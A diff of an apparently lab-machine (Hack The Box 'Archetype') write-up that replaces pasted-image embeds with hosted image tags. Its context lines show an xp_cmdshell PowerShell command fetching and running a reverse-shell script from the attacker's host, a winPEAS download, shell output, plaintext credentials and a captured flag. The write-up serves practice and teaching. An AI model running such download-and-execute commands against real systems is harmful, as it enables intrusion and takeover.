@@ -129,7 +129,8 @@ smb: \>
 Password=M3g4c0rp123
 
 
-![[Pasted image 20260722181951.png]]
+<img width="1914" height="283" alt="image" src="https://github.com/user-attachments/assets/c3aab7b8-4ffe-4916-85b0-838b8c8a5a31" />
+
 
 
 
@@ -179,7 +180,8 @@ SQL (ARCHETYPE\sql_svc  dbo@master)>
  	 	
 xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://10.10.14.205:8080/powershell-reverse-shell.ps1\")
 
-![[Pasted image 20260722191759.png]]
+<img width="1901" height="461" alt="image" src="https://github.com/user-attachments/assets/a3ea7f7e-c7d7-4df7-8c76-e07a7b551879" />
+
 
 ```
 impacket-mssqlclient sql_svc@10.129.179.20 -windows-auth
@@ -207,14 +209,15 @@ connect to [10.10.14.205] from (UNKNOWN) [10.129.179.20] 50417
 SHELL> 
 ```
 
-![[Pasted image 20260722193917.png]]
+<img width="941" height="421" alt="image" src="https://github.com/user-attachments/assets/bf6e12de-d263-40a8-aec5-bcd90543cc7f" />
+
 
 user.txt=3e7b102e78218e935bf3f4951fec21a3
 ```
 Invoke-WebRequest -UseBasicParsing -Uri "http://10.10.14.205:8080/winPEASx64.exe" -OutFile "C:\Users\sql_svc\Desktop\winPEASx64.exe"
 ```
 
-![[Pasted image 20260722195406.png]]
+<img width="1453" height="415" alt="image" src="https://github.com/user-attachments/assets/9ec35763-b367-43f0-86ab-cf13e7987b0d" />
 
 user:administrator MEGACORP_4dm1n!!
 
@@ -282,14 +285,17 @@ C:\Users\Administrator\Desktop>
 Invoke-WebRequest -UseBasicParsing -Uri "http://10.10.14.205:8080/winPEASx64.exe" -OutFile "C:\Users\sql_svc\Desktop\winPEASx64.exe"
 ```
 
-![[Pasted image 20260722200831.png]]
-
-
-![[Pasted image 20260722201009.png]]
+<img width="1910" height="772" alt="image" src="https://github.com/user-attachments/assets/f976bc75-7737-483d-b52e-dd74568ea33f" />
 
 
 
-![[Pasted image 20260722200656.png]]
+<img width="1873" height="406" alt="image" src="https://github.com/user-attachments/assets/87418560-8ee6-479e-a488-13c097141e9c" />
+
+
+
+
+<img width="1132" height="600" alt="image" src="https://github.com/user-attachments/assets/d2754aa4-3962-4d1f-bd5d-f14cf34a52af" />
+
 
 
 
